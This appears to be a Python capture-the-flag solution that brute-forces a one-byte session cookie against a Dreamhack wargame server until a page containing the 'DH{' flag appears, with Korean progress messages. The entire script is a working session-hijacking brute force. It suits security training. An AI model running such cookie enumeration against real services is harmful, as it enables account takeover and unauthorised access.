import requests

url = 'http://host3.dreamhack.games:11979/'

for i in range(0, 256):
  session_id = f"{i:02x}"
  cookies = {'sessionid' : session_id}
  
  response = requests.get(url, cookies=cookies)
  
  if "DH{" in response.text:
    print(f"\nSessionID: {session_id}\n내용: {response.text}")
    break
  print(f"\r탐색 중...{session_id}", end="")
  